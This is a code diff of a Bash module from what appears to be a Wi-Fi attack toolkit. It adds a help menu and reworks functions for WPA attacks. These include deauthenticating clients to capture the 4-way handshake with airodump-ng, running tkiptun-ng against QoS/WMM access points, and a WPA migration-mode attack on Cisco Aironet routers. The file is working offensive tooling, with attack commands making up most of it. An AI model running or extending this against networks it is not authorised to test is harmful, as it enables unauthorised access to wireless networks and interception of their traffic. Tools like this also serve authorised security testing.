@@ -16,31 +16,53 @@
 
 # Warning! at least generic, internal and interface must be loaded before this one!
 
+check_function auth_attacks_fake || source $path/attacks/auth # It depends on auth module ;)
+
 wpa_attacks(){
+    hardclean && $clear 
     attack=$1; shift;
     wpa_attacks_$attack $@
 }
 
 wpa_attacks_menu(){
+	help_fifo "${mark}${red}WPA attacks${end}\n"\
+		"You're seeing this menu because the network you selected has WPA encryption\n"\
+		"${red}Standard deauth attack${end}\n"\
+		"Deauths a client, then waits for the client to reconnect and tries to capture the 4-way handshake\n"\
+		"${red}QOS attack${end}\n"\
+		"Launches tkiptun-ng to try to crack some vulnerable accesspoints to the wmm stuff\n"\
+		"${red}WPA Migration Mode attack${end}\n"\
+		"This attack targets on Cisco Aironet routers, wich set both WPA and WEP encriptions on the same sssid\nIt listens for a wep-encapsulated arp packet and retransmits it (bitflipped to make it into an ARP coming from the attacker's MAC)"
+
     while true; do
         $clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)" "WPA migration mode"
         case $choice in
-             1) wpa_attacks_handshake; $clear; break;;
-             2) wpa_attacks_qos; $clear; break;;
-             3) Host_ENC="WEP"; wep_attacks_fakeauto & { AUTO=2; choice=3; othersinjectmenu; AUTO=0; }; $clear; break;;
+             1) wpa_attacks handshake; $clear; break;;
+             2) wpa_attacks qos; $clear; break;;
+             3) Host_ENC="WEP"; wep_attacks fakeauto & { AUTO=2; choice=3; othersinjectmenu; AUTO=0; }; $clear; break;;
         esac
     done
 }
 
 wpa_attacks_handshake(){
-    $clear && hardclean
+
+	[[ $dynamic_client_selection ]] && {
+		auto_scan_clients;
+		select_client; 
+	}
+
+	[[ $Client_MAC != ""  ]] && { directed=1; }
+	clear=""
     execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP --ignore-negative-one  -w $DUMP_PATH/$Host_MAC --bssid $Host_MAC --channel $Host_CHAN -a $wifi 
-    choosedeauth
+
+	[[ $directed == 1 ]] && choose_deauth 2
+	[[ $directed != 1 ]] && choose_deauth 3 
+
+
 }
 
 wpa_attacks_qos(){
-     $clear && hardclean 
-     ifconfig $wificard channel $Host_CHAN # Hope this is ok for all cards
+     iwconfig $wificard channel $Host_CHAN # Hope this is ok for all cards
      execute "Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $wifi 
 }
 
